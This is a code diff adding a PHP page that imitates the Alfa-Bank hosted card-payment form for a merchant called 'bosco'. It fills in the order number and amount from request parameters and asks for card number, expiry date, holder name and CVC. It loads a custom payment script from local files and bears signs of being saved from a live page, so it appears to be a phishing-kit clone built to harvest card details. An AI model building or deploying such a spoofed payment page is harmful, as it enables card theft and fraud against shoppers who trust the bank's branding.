@@ -1,0 +1,159 @@
+<?php
+if(!empty($_REQUEST["o"]))
+{
+	$ORDER_ID = intval($_REQUEST["ORDER_ID"]);
+}
+if(!empty($_REQUEST["s"]))
+{
+	$SUM = intval($_REQUEST["SUM"]);
+}
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache inlinesvg smil"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<script src="links/modernizr.js" type="text/javascript"></script>
+			
+
+		<link href="links/reset.css" rel="stylesheet" type="text/css">
+		<link href="links/fonts.css" rel="stylesheet" type="text/css">
+		<link href="links/main.css" rel="stylesheet" type="text/css">
+
+		<script type="text/javascript" src="links/jquery-1.8.1.min.js"></script>
+		<script type="text/javascript" src="links/jquery.url.js"></script>
+		<script type="text/javascript" src="links/jquery.timers-1.2.js"></script>
+		<script type="text/javascript" src="links/maskedinput.js"></script>
+		<script type="text/javascript" src="links/additional.js"></script>
+		<script type="text/javascript" src="links/jquery.payment_new.js"></script>
+		<script>
+			$(document).ready(function () {initVisualPan(); });
+			$(document).payment({
+	            language: "ru",
+	            messageAjaxError: "Сервис временно недоступен. Попробуйте позднее.",
+	            messageTimeRemaining: "#MIN#:#SEC#",
+	            visualValidationEnabled: true,
+	            bindingCheckboxEnabled:true,
+	            agreementCheckboxEnabled: false,
+	            getFeeEnabled: true,
+	            orderId:"orderNumber",
+	            onReady: function () {
+	                $(document).ready(function () {
+	                    initBindings();
+	                    // initMain();
+	                    // initSelect();
+	                    $("#buttonPayment").bind('click.payment', function(){
+	                    	updateErrors();
+	                    });
+	                    $("#buttonBindingPayment").bind('click.payment', function(){
+	                        $("#year").removeClass("invalid");
+	                        $("#month").removeClass("invalid");
+	                        $("#iTEXT").removeClass("invalid");
+	                        $("#iPAN").removeClass("invalid");
+	                        updateErrors()
+	                    });
+	                    rebuildMonthSelect();
+	                });
+	            }
+	        });
+		</script>
+	</head>
+	<body>
+		<div class="bosco__container">
+
+		    <div class="bosco__order-number">Номер заказа: <span id="orderNumber"><?php echo $ORDER_ID; ?></span></div>
+			<div class="bosco__order-amount">Сумма платежа: <span id="rawAmount"><?php echo $SUM; ?></span> <span>руб.</span></div>
+			<div class="bosco__sep-line"></div>
+			
+			<div class="bosco__title">Безопасный платеж без комиссии</div>
+			<div class="bosco__subtitle">Введите данные вашей карты</div>
+			<div class="bosco__cards">
+			    <form name="PaymentForm" action="https://pay.alfabank.ru/payment/merchants/bosco/payment_ru.html#" method="post" id="formPayment">
+			    	<input type="hidden" id="expiry">
+		            <input type="hidden" id="mdOrder">
+		            <input type="hidden" id="location" value="/../">
+		            <input type="hidden" id="language" value="&lt;ru&gt;">
+		            <div class="bosco__card-image"><div class="bosco__card-image-wrapper">
+				        <div class="bosco__cards-row number-selection-js">
+							<label for="cardnumber">Номер карты:</label>
+							<div class="bosco__cards-input-group single">
+								<input type="text" class="visual-pan-js">
+							</div>
+							<input type="hidden" id="iPAN" name="$PAN" maxlength="19">
+						</div>
+						<div class="bosco__cards-row __exp choice-date-js">
+							<label for="cardexp">Срок действия карты (месяц/год):</label>
+							<div class="bosco__cards-input-group date">
+								<select class="select select-month" name="MM" id="month">
+		                            <option value="01">Январь</option>
+		                            <option value="02">Февраль</option>
+		                            <option value="03">Март</option>
+		                            <option value="04">Апрель</option>
+		                            <option value="05">Май</option>
+		                            <option value="06">Июнь</option>
+		                            <option value="07">Июль</option>
+		                            <option value="08">Август</option>
+		                            <option value="09">Сентябрь</option>
+		                            <option value="10">Октябрь</option>
+		                            <option value="11">Ноябрь</option>
+		                            <option value="12">Декабрь</option>
+		                        </select>
+		                        <select class="select select-year" name="YYYY" id="year"><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option></select>
+							</div>
+						</div>
+
+						<div class="bosco__cards-row name-card-js">
+							<label for="cardowner">Имя и фамилия держателя карты (латинскими буквами)</label>
+							<input type="text" name="TEXT" id="iTEXT" maxlength="90" autocomplete="off">
+						</div>
+						
+						<div class="bosco__cards-row __cvv code-js">
+							<input inputmode="numeric" pattern="[0-9]*" maxlength="3" class="code" type="password" name="$CVC" id="iCVC" autocomplete="off">
+							<label for="iCVC">Введите три последние цифры</label>
+						</div>
+					</div></div>
+				</form>	
+				<form id="acs" method="post" action="https://pay.alfabank.ru/payment/merchants/bosco/payment_ru.html">
+		            <input type="hidden" id="MD" name="MD">
+		            <input type="hidden" id="PaReq" name="PaReq">
+		            <input type="hidden" id="TermUrl" name="TermUrl">
+		        </form>
+				<div class="bosco__card-row-rememver">
+					<div class="time-wrap">До окончания сессии осталось <span class="time" id="numberCountdown"></span></div>
+				</div>
+				
+				<div class="bosco__sep-line"></div>
+				<div class="bottom-row hidden">
+                    <!--<a class="alfaclick-btn" id="buttonPaymentAlfa">-->
+                    <!--<strong><span>Можно оплатить<br/>через Альфа-Клик</span></strong>-->
+                    <!--</a>-->
+                    <a class="alfaclick-btn" id="buttonPaymentAlfa" style="display: none;">
+                        <strong><span>Можно оплатить<br>через Альфа-Клик</span></strong>
+                    </a>
+                    <div class="ch-col">
+                        <div id="bindingBlock" class="row">
+                            <label class="ch-wrap"><input type="checkbox" checked="checked" class="checkbox" id="createBinding">
+                                Запомнить данные этой карты</label>
+                        </div>
+                        <div class="row agreeBox" id="agreeBlock" style="display: none;">
+                            <label class="ch-wrap"><input type="checkbox" class="checkbox" id="agreeCheckbox"> Я ознакомлен и принимаю условия<br><a id="agreeHref" href="https://pay.alfabank.ru/payment/merchants/bosco/payment_ru.html#">договора-оферты</a></label>
+                        </div>
+                    </div>
+                </div>
+				<div class="bosco__cards-row __alone __side">
+					<div class="bosco__cards-row-side">
+						<button class="bosco__submit" type="button" id="buttonPayment" title="Оплатить">Оплатить</button>
+						<button class="bosco__submit" type="button" id="buttonBindingPayment2" title="Оплатить" style="display: none;">Оплатить</button>
+					</div>
+				</div>
+
+				<div class="bosco__sep-line"></div>
+			</div>
+			<div id="description"></div>
+			<div id="errorBlock"></div>
+            <div id="errorBlock1"></div>
+            <div id="infoBlock"></div>
+			
+			<div class="bosco__payment-ico">
+				<img src="links/payment-sys.jpg" alt="">
+			</div>
+		</div>
+	
+</body></html>
